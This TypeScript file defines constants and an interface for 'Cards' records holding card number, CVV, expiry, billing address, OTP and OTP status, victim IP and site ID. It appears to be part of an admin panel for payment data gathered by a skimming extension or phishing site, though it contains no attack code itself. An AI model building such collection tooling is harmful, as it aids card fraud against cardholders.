import api from "../../services/cookie";
import { ExtensionState } from "../Extension/constant";
export const ITEM_NAME = "Cards";
export const SEARCH_COLUMNS: string[] = ["ip", "country", "uid"];
export const API = api;
export interface CookieState {
  _id?: string,
  orderId: number;
  cardNumber: string;
  cardNumberStatus: string;
  expiredDate: string;
  cvv: string;
  placeholder?: string;
  type: string;
  country?: string;
  status?: string;
  city: string;
  street: string;
  zipcode: string;
  otp?: string;
  otpStatus?: string;
  ip: string;
  createdAt?: Date,
  updatedAt?: Date,
  siteId?: string;
  tags?: string[];
  done?: boolean;
}